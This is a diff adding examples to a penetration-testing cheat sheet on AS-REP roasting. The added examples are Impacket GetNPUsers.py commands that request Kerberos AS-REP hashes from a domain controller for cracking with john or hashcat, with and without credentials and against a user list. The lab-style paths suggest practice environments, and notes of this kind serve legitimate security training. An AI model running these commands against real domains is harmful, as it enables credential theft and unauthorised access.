@@ -25,9 +25,22 @@ With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.p
 ```shell
 # check ASREPRoast for all domain users (credentials required)
 python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+python3 GetNPUsers.py COMPANY.local/james:Password123 -request -format john -outputfile /home/ubuntu/Documents/file/dir/asrep.out -dc-ip 172.16.1.20
 
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+```
+
+* attempt with no password&#x20;
+
+```
+python3 GetNPUsers.py COMPANY.local/james -no-pass -dc-ip 172.16.1.20
+```
+
+* Attempt with a userlist of potentially valid users
+
+```
+python3 GetNPUsers.py COMPANY.local/ -usersfile /home/ubuntu/Documents/htb/dir/users.txt -format hashcat -outputfile /home/ubuntu/Documents/htb/dir/valid-users.out
 ```
 
 With [Rubeus](https://github.com/GhostPack/Rubeus):
